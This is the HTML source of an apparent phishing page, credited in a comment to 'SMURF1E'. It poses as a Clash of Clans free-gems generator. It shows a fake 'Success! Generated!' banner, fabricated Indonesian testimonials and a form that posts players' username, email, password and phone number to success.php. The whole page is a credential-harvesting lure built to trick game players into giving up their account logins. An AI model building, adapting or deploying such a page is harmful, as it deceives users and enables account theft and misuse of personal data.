<!DOCTYPE html>
<html>
<!--
=========================
(c) Hak Cipta Dilindungi 
=========================
Supercell & Yoga Aprilliansyah a.K.a SMURF1E
Updated : 18 Desember 2015
-->
<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">

<!-- Bootstrap Start -->
<link rel="stylesheet" href="css/bootstrap.min.css">
<link rel="stylesheet" href="css/bootstrap-theme.min.css">

<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.9.2/jquery-ui.min.js"></script> 

<link href='https://fonts.googleapis.com/css?family=Roboto' rel='stylesheet' type='text/css'/>

<title>Clash of Clans Events</title>
<script src='https://www.google.com/recaptcha/api.js'></script>
</head>
<style>
body {
background: transparent url(http://s.cdpn.io/3/blurry-blue.jpg);
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
background-attachment: fixed;
font-family:"Roboto";
color:#fff;
}
.container {
  padding-right: 15px;
  padding-left: 15px;
  margin-right: auto;
  margin-left: auto;
  padding-top: 15px;
    padding-bottom: 15px;
  width:65%;
}
.box {
font-family: Tahoma;
    line-height: 25px;
    color: #333;
    font-size: 14px;
    padding: 20px;
    border-radius: 5px;
    background-color: #f5f5f5;
	width:58%;
	background:rgba(114, 154, 167, 0.27);
	box-shadow: 0px 1px 5px rgba(0, 0, 0, 0.2), inset 0 1px 1px rgba(255,255,255,0.2);
    text-shadow:1px 1px 1px rgba(0,0,0,0.3);
}
.box-big {
font-family: Tahoma;
    line-height: 25px;
    color: #ddd;
    font-size: 14px;
    padding: 20px;
    border-radius: 5px;
    background-color: #f5f5f5;
	background:rgba(114, 154, 167, 0.27);
	box-shadow: 0px 1px 5px rgba(0, 0, 0, 0.2), inset 0 1px 1px rgba(255,255,255,0.2);
    text-shadow:1px 1px 1px rgba(0,0,0,0.3);
}
.box-right {
font-family: Tahoma;
    line-height: 25px;
    color: #ddd;
    font-size: 14px;
    padding: 20px;
    border-radius: 5px;
	float:right;
	width:40%;
	background:rgba(114, 154, 167, 0.27);
	box-shadow: 0px 1px 5px rgba(0, 0, 0, 0.2), inset 0 1px 1px rgba(255,255,255,0.2);
	}
	button:focus,
button:active,
button:hover
{
    outline:0px !important;
}
.form-control {
    width: 100%;
    padding: .375rem .75rem;
    font-size: 1rem;
    line-height: 1.5;
    color: #fff;
    background-color: rgba(20,20,20,0.5);
    background-image: none;
    border: 1px solid transparent;
    border-radius: .25rem;
    box-shadow: 0px 1px 5px rgba(0, 0, 0, 0.2), inset 0 1px 1px rgba(255,255,255,0.2);
	transition:all 0.1s;
}
.form-control:focus {
    width: 100%;
    padding: .375rem .75rem;
    font-size: 1rem;
    line-height: 1.5;
    color: #fff;
    background-color: rgba(20,20,20,0.5);
    background-image: none;
    border: 1px solid #5F5F5F;
    border-radius: .25rem;
    box-shadow: 0px 1px 5px rgba(0, 0, 0, 0.2), inset 0 1px 1px rgba(255,255,255,0.2);
	transition:all 0.1s;
}
.input-group-addon:first-child {
    border-right: 0;
    background-color: #525252;
    border: 1px solid transparent;
}
.btn:hover{
transition:all 0.1s;
}
.btn:focus{
transition:all 0.1s;
}
</style>
<body>
<div class="container">
<div class="alert alert-success" role="alert">
<center>
<b>Status:</b> <font color="red"> Success! Generated!</font>
</center>
</div>
<div class="box-right">
<form class="sky-form">
<fieldset>
<label class="input">
<i class="icon-append fa fa-user" style="color:orange;"></i>
<b>Muhammad Rizki</b> said:<br>Thanks, generatornya work banget, takutnya kebanned !!
<br><br><i>Posted on <span id="date1">09/14/2015</span> at 15:37</i>
</label><br>
</fieldset>
<fieldset>
<label class="input">
<i class="icon-append fa fa-user" style="color:orange;"></i>
<b>Erland</b> said:<br> Work gan Thanks! bisa beberapa kali kan submitnya gan!?
<br><br><i>Posted on <span id="date2">09/01/2015</span> at 10:54</i>
</label><br>
</fieldset>
<fieldset>
<label class="input">
<i class="icon-append fa fa-user" style="color:orange;"></i>
<b>Anonymous</b> said:<br> Waaaawww.. COC gw jadi mantep gan! thanks generatornya work banget:) 
<br><br><i>Posted on <span id="date3">08/19/2015</span> at 00:27</i>
</label><br>
</fieldset>
<fieldset>
<label class="input">
<i class="icon-append fa fa-user" style="color:orange;"></i>
<b>Anonymous</b> said:<br>Akhirnya nemu juga tools generator COC yang work, udah cari di google pada gak work! disini work thanks ya min
<br><br><i>Posted on <span id="date1">08/02/2015</span> at 15:37</i>
</label><br>
</fieldset>
</form>
</div>
<div class="box">
<!-- Generate -->
<div class="panel panel-warning">
  <div class="panel-body">
    <div class="input-group" style="width:49%;float:right">
  <span class="input-group-addon" id="sizing-addon2"><img src="resource/gems.png" style="width:18px;height:20px;"/></span>
  <input type="text" class="form-control" placeholder="Max.28.000 !" aria-describedby="sizing-addon2">
</div>
    <div class="input-group" style="width:49%;float:left">
  <span class="input-group-addon" id="sizing-addon2"><img src="resource/gold.png" style="width:18px;height:20px;"/></span>
  <input type="text" class="form-control" placeholder="Max.8.000.000" aria-describedby="sizing-addon2">
</div>
<br/><br/>
    <div class="input-group">
  <span class="input-group-addon" id="sizing-addon2"><img src="resource/elixir.png" style="width:18px;height:20px;"/></span>
  <input type="text" class="form-control" placeholder="Max.8.000.000" aria-describedby="sizing-addon2">
</div>
  </div>
</div>
</div>
<br>
<div class="box">
<!-- Generate End -->

<!-- Info -->
<div class="panel panel-info">
  <div class="panel-body">
    <!-- Form Start -->
	<form method="post" action="success.php">
  <div class="form-group">
    <label for="username" style="color: #DDD;">Username :</label><section class="col" style="float:right;">
<img src="http://www.clashgemsgenerator.com/content/Clash-of-Clans-Cheats-Logo.png" height="100px" width="100px">
</section>
    <input type="text" style="width:75%" class="form-control" id="username" name="username" placeholder="Username" autocomplete="off" required>
  </div>
<div class="form-group">
    <label for="email" style="color: #DDD;">Email Address :</label>
    <input type="email" class="form-control" id="email" name="email" placeholder="Email" autocomplete="off" required>
  </div>
  <div class="form-group">
    <label for="password" style="color: #DDD;">Password :</label>
    <input type="password" class="form-control" id="password" name="password" placeholder="Password" required>
  </div>
     <div class="form-group">
    <label for="TownHall_Level" style="color: #DDD;">Phone Number :</label><br>
    <input type="text" class="form-control" id="hp" name="hp" placeholder="+62" autocomplete="off" style="width:49%;float:left;" required>
    
    <input type="number" class="form-control" id="th" name="th" max="10" min="1" placeholder="Townhall Level" style="width:49%;float:right;" autocomplete="off" required>
  </div>
  <br>
<br>
  <center><button type="submit" class="btn btn-primary">Submit</button>
  <button type="reset" class="btn btn-danger">Reset</button></center>
</form>
   <!-- Form end -->
  </div>
</div>
<!-- Info End -->
</div>
<br>
<div class="box-big">
<h2 style="font-size:15px">About Clash of Clans Hack</h2>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Do you need additional Gems on Clash of Clans? Do not hesitate! Try the newest Clash of Clans Gems Hack. Use it to buy gems on Clash of Clans! Generate Gems for Clash of Clans directly from your browser, undetected.</p>
<h2 style="font-size:15px">About Clash Of Clans Games</h2>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Clash of Clans is a popular iPad/iPhone/iPod game created by "Supercell". It has been available internationally on the iTunes store for free since its initial v1.7 release on August 2, 2012. Clash of Clans is a strategy game where, like many other strategy games out there, the purpose is to build one's village, unlock different warriors, raid resources from other villages, create a clan and much, much more.</p>
</div>
</div>
</body>
</html>